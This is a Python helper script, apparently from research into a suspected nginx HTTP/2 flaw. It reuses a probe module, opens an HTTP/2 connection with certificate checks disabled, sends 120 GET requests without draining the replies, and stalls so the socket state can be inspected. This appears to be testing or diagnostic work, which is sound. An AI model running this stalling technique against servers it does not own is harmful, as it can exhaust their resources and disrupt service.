#!/usr/bin/env python3
"""Stall a connection (120 GETs, no drain) and sleep so ss can inspect it."""
import socket, ssl, sys, os, importlib.util, time

_mod_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "probe", "nginx-http2-rce-probe.py")
_spec = importlib.util.spec_from_file_location("probe_mod", _mod_path)
_m = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_m)
globals().update({k: getattr(_m, k) for k in dir(_m) if not k.startswith("_")})

HOST = os.environ.get("PROBE_HOST", "localhost")
PORT = int(os.environ.get("PROBE_PORT", 8443))
N = int(os.environ.get("N", 120))
SLEEP = float(os.environ.get("SLEEP", 90))

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])
s = socket.create_connection((HOST, PORT), timeout=10)
print("client rcvbuf:", s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 16 * 1024) or
      s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF))
ss = ctx.wrap_socket(s, server_hostname=HOST)

ss.sendall(HTTP2_PREFACE)
ss.sendall(h2_frame(FRAME_SETTINGS, 0, 0))
data = b""
end = time.time() + 3
while time.time() < end and len(data) < 60:
    ss.settimeout(1)
    try:
        data += ss.recv(4096)
    except socket.timeout:
        break
ss.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0))
send_window_update(ss, 0, MAX_WINDOW - 65535)

hdrs = [(":method", "GET"), (":scheme", "https"),
        (":authority", HOST), (":path", "/big.bin")]
payload = hpack_request(hdrs)
out = b""
for i in range(N):
    out += h2_frame(FRAME_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, 1 + 2 * i, payload)
ss.sendall(out)
print("GETs sent; stalling %ss (pid %d)" % (SLEEP, os.getpid()))
time.sleep(SLEEP)
